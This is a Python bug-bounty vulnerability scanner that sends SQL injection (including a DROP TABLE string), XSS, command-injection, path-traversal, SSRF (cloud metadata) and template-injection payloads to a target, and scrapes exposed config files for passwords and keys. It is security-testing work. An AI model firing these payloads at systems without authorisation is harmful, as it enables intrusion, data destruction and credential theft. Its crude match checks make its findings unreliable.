"""
Vulnerability Scanner for Bug Bounty Automation
Comprehensive vulnerability detection and assessment
"""

import asyncio
import json
import logging
import re
import time
from typing import Dict, List, Optional, Any, Set
from urllib.parse import urljoin, urlparse

import aiohttp
import requests
from bs4 import BeautifulSoup

class VulnerabilityScanner:
    """Advanced vulnerability scanner for bug bounty targets"""
    
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.session = None
        
        # Vulnerability storage
        self.vulnerabilities = []
        self.severity_scores = {
            'critical': 10,
            'high': 7,
            'medium': 4,
            'low': 1,
            'info': 0.1
        }
    
    async def run_scanning(self, target: str, recon_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run comprehensive vulnerability scanning"""
        self.logger.info(f"Starting vulnerability scanning for: {target}")
        
        # Initialize session
        self.session = aiohttp.ClientSession(
            headers=self.config.get('headers', {}),
            timeout=aiohttp.ClientTimeout(total=30)
        )
        
        try:
            # Phase 1: Web Application Vulnerabilities
            await self._scan_web_vulnerabilities(target, recon_data)
            
            # Phase 2: Network Vulnerabilities
            await self._scan_network_vulnerabilities(target, recon_data)
            
            # Phase 3: Configuration Issues
            await self._scan_configuration_issues(target, recon_data)
            
            # Phase 4: Information Disclosure
            await self._scan_information_disclosure(target, recon_data)
            
            # Compile results
            results = {
                "target": target,
                "vulnerabilities": self.vulnerabilities,
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical_count": len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                "high_count": len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                "medium_count": len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                "low_count": len([v for v in self.vulnerabilities if v['severity'] == 'low']),
                "info_count": len([v for v in self.vulnerabilities if v['severity'] == 'info']),
                "risk_score": self._calculate_risk_score(),
                "timestamp": time.time()
            }
            
            self.logger.info(f"Vulnerability scanning completed for {target}")
            return results
            
        finally:
            await self.session.close()
    
    async def _scan_web_vulnerabilities(self, target: str, recon_data: Dict[str, Any]):
        """Scan for web application vulnerabilities"""
        self.logger.info("Scanning for web application vulnerabilities...")
        
        # SQL Injection Testing
        await self._test_sql_injection(target)
        
        # XSS Testing
        await self._test_xss(target)
        
        # CSRF Testing
        await self._test_csrf(target)
        
        # Command Injection Testing
        await self._test_command_injection(target)
        
        # Path Traversal Testing
        await self._test_path_traversal(target)
        
        # SSRF Testing
        await self._test_ssrf(target)
        
        # Template Injection Testing
        await self._test_template_injection(target)
    
    async def _test_sql_injection(self, target: str):
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT null,null--",
            "admin'--"
        ]
        
        # Test common parameters
        test_urls = [
            f"https://{target}/search?q=",
            f"https://{target}/login?username=",
            f"https://{target}/product?id=",
            f"https://{target}/page?id="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for SQL error patterns
                        sql_errors = [
                            "mysql_fetch_array",
                            "ORA-01756",
                            "Microsoft OLE DB Provider",
                            "SQLServer JDBC Driver",
                            "PostgreSQL query failed"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                self._add_vulnerability({
                                    'type': 'SQL Injection',
                                    'severity': 'critical',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'SQL error detected with payload: {payload}',
                                    'proof_of_concept': test_url
                                })
                                break
                                
                except Exception as e:
                    self.logger.debug(f"SQL injection test failed for {url}: {e}")
    
    async def _test_xss(self, target: str):
        """Test for Cross-Site Scripting vulnerabilities"""
        payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>"
        ]
        
        # Test common XSS vectors
        test_urls = [
            f"https://{target}/search?q=",
            f"https://{target}/comment?text=",
            f"https://{target}/feedback?message=",
            f"https://{target}/contact?name="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check if payload is reflected
                        if payload in content:
                            self._add_vulnerability({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'high',
                                'url': test_url,
                                'payload': payload,
                                'description': f'XSS payload reflected in response',
                                'proof_of_concept': test_url
                            })
                            
                except Exception as e:
                    self.logger.debug(f"XSS test failed for {url}: {e}")
    
    async def _test_csrf(self, target: str):
        """Test for Cross-Site Request Forgery vulnerabilities"""
        try:
            # Check for CSRF tokens in forms
            url = f"https://{target}"
            async with self.session.get(url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                forms = soup.find_all('form')
                for form in forms:
                    # Check if form has CSRF token
                    csrf_inputs = form.find_all('input', {'name': re.compile('csrf|token')})
                    
                    if not csrf_inputs:
                        action = form.get('action', url)
                        self._add_vulnerability({
                            'type': 'Cross-Site Request Forgery (CSRF)',
                            'severity': 'medium',
                            'url': urljoin(url, action),
                            'description': 'Form lacks CSRF protection',
                            'proof_of_concept': f'Form at {action} has no CSRF token'
                        })
                        
        except Exception as e:
            self.logger.debug(f"CSRF test failed: {e}")
    
    async def _test_command_injection(self, target: str):
        """Test for Command Injection vulnerabilities"""
        payloads = [
            "; ls",
            "| whoami",
            "&& cat /etc/passwd",
            "; ping -c 1 127.0.0.1",
            "| id"
        ]
        
        test_urls = [
            f"https://{target}/ping?host=",
            f"https://{target}/exec?cmd=",
            f"https://{target}/system?command="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for command execution indicators
                        indicators = ['uid=', 'gid=', 'root:', 'bin:', 'daemon:']
                        for indicator in indicators:
                            if indicator in content:
                                self._add_vulnerability({
                                    'type': 'Command Injection',
                                    'severity': 'critical',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'Command execution detected with payload: {payload}',
                                    'proof_of_concept': test_url
                                })
                                break
                                
                except Exception as e:
                    self.logger.debug(f"Command injection test failed for {url}: {e}")
    
    async def _test_path_traversal(self, target: str):
        """Test for Path Traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        test_urls = [
            f"https://{target}/download?file=",
            f"https://{target}/view?path=",
            f"https://{target}/file?name="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for file content disclosure
                        if 'root:' in content or 'daemon:' in content:
                            self._add_vulnerability({
                                'type': 'Path Traversal',
                                'severity': 'high',
                                'url': test_url,
                                'payload': payload,
                                'description': f'File content disclosed with payload: {payload}',
                                'proof_of_concept': test_url
                            })
                            
                except Exception as e:
                    self.logger.debug(f"Path traversal test failed for {url}: {e}")
    
    async def _test_ssrf(self, target: str):
        """Test for Server-Side Request Forgery vulnerabilities"""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/"
        ]
        
        test_urls = [
            f"https://{target}/fetch?url=",
            f"https://{target}/proxy?url=",
            f"https://{target}/image?url="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for SSRF indicators
                        if 'root:' in content or '169.254.169.254' in content:
                            self._add_vulnerability({
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'high',
                                'url': test_url,
                                'payload': payload,
                                'description': f'SSRF vulnerability detected with payload: {payload}',
                                'proof_of_concept': test_url
                            })
                            
                except Exception as e:
                    self.logger.debug(f"SSRF test failed for {url}: {e}")
    
    async def _test_template_injection(self, target: str):
        """Test for Template Injection vulnerabilities"""
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{7*'7'}}",
            "${7*'7'}"
        ]
        
        test_urls = [
            f"https://{target}/render?template=",
            f"https://{target}/view?template=",
            f"https://{target}/generate?template="
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = url + payload
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check if template is evaluated
                        if '49' in content:  # 7*7 = 49
                            self._add_vulnerability({
                                'type': 'Template Injection',
                                'severity': 'high',
                                'url': test_url,
                                'payload': payload,
                                'description': f'Template injection detected with payload: {payload}',
                                'proof_of_concept': test_url
                            })
                            
                except Exception as e:
                    self.logger.debug(f"Template injection test failed for {url}: {e}")
    
    async def _scan_network_vulnerabilities(self, target: str, recon_data: Dict[str, Any]):
        """Scan for network-level vulnerabilities"""
        self.logger.info("Scanning for network vulnerabilities...")
        
        # Check for open ports with known vulnerabilities
        open_ports = recon_data.get('open_ports', [])
        
        vulnerable_services = {
            21: ('FTP', 'Anonymous access, weak authentication'),
            22: ('SSH', 'Weak key exchange, outdated version'),
            23: ('Telnet', 'Unencrypted communication'),
            25: ('SMTP', 'Open relay, weak authentication'),
            53: ('DNS', 'Zone transfer, cache poisoning'),
            80: ('HTTP', 'Unencrypted communication, outdated version'),
            110: ('POP3', 'Weak authentication, unencrypted'),
            143: ('IMAP', 'Weak authentication, unencrypted'),
            443: ('HTTPS', 'SSL/TLS vulnerabilities'),
            993: ('IMAPS', 'SSL/TLS vulnerabilities'),
            995: ('POP3S', 'SSL/TLS vulnerabilities'),
            3306: ('MySQL', 'Default credentials, weak authentication'),
            3389: ('RDP', 'Weak authentication, outdated version'),
            5432: ('PostgreSQL', 'Default credentials, weak authentication'),
            6379: ('Redis', 'No authentication, weak configuration'),
            8080: ('HTTP-Alt', 'Unencrypted communication, outdated version'),
            8443: ('HTTPS-Alt', 'SSL/TLS vulnerabilities'),
            9200: ('Elasticsearch', 'No authentication, information disclosure'),
            27017: ('MongoDB', 'No authentication, information disclosure')
        }
        
        for port in open_ports:
            if port in vulnerable_services:
                service, description = vulnerable_services[port]
                self._add_vulnerability({
                    'type': f'Network Service - {service}',
                    'severity': 'medium',
                    'port': port,
                    'description': f'{service} service on port {port} - {description}',
                    'proof_of_concept': f'Port {port} is open and running {service}'
                })
    
    async def _scan_configuration_issues(self, target: str, recon_data: Dict[str, Any]):
        """Scan for configuration issues"""
        self.logger.info("Scanning for configuration issues...")
        
        try:
            url = f"https://{target}"
            async with self.session.get(url) as response:
                headers = dict(response.headers)
                
                # Check for missing security headers
                security_headers = [
                    'X-Frame-Options',
                    'X-Content-Type-Options',
                    'X-XSS-Protection',
                    'Strict-Transport-Security',
                    'Content-Security-Policy'
                ]
                
                for header in security_headers:
                    if header not in headers:
                        self._add_vulnerability({
                            'type': 'Missing Security Header',
                            'severity': 'medium',
                            'header': header,
                            'description': f'Missing security header: {header}',
                            'proof_of_concept': f'Header {header} not present in response'
                        })
                
                # Check for information disclosure in headers
                if 'Server' in headers:
                    server = headers['Server']
                    if 'apache' in server.lower() or 'nginx' in server.lower():
                        self._add_vulnerability({
                            'type': 'Information Disclosure',
                            'severity': 'low',
                            'header': 'Server',
                            'description': f'Server information disclosed: {server}',
                            'proof_of_concept': f'Server header reveals technology stack'
                        })
                
                # Check for debug mode
                content = await response.text()
                if 'debug' in content.lower() or 'trace' in content.lower():
                    self._add_vulnerability({
                        'type': 'Debug Mode Enabled',
                        'severity': 'medium',
                        'description': 'Debug information may be exposed',
                        'proof_of_concept': 'Debug information found in page content'
                    })
                    
        except Exception as e:
            self.logger.debug(f"Configuration scan failed: {e}")
    
    async def _scan_information_disclosure(self, target: str, recon_data: Dict[str, Any]):
        """Scan for information disclosure vulnerabilities"""
        self.logger.info("Scanning for information disclosure...")
        
        # Check common information disclosure paths
        disclosure_paths = [
            '/.env',
            '/config.php',
            '/backup.sql',
            '/admin/config.php',
            '/wp-config.php',
            '/.git/config',
            '/robots.txt',
            '/sitemap.xml'
        ]
        
        for path in disclosure_paths:
            try:
                url = f"https://{target}{path}"
                async with self.session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for sensitive information
                        sensitive_patterns = [
                            r'password\s*=\s*["\']([^"\']+)["\']',
                            r'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
                            r'database[_-]?url\s*=\s*["\']([^"\']+)["\']',
                            r'secret[_-]?key\s*=\s*["\']([^"\']+)["\']'
                        ]
                        
                        for pattern in sensitive_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                self._add_vulnerability({
                                    'type': 'Information Disclosure',
                                    'severity': 'high',
                                    'path': path,
                                    'description': f'Sensitive information found in {path}',
                                    'proof_of_concept': f'Pattern matched in {path}: {matches[0]}'
                                })
                                break
                                
            except Exception as e:
                self.logger.debug(f"Information disclosure scan failed for {path}: {e}")
    
    def _add_vulnerability(self, vuln_data: Dict[str, Any]):
        """Add a vulnerability to the results"""
        vulnerability = {
            'id': len(self.vulnerabilities) + 1,
            'timestamp': time.time(),
            **vuln_data
        }
        self.vulnerabilities.append(vulnerability)
        self.logger.info(f"Found vulnerability: {vuln_data['type']} - {vuln_data['severity']}")
    
    def _calculate_risk_score(self) -> float:
        """Calculate overall risk score"""
        total_score = 0
        for vuln in self.vulnerabilities:
            severity = vuln['severity']
            total_score += self.severity_scores.get(severity, 0)
        
        return round(total_score, 2)
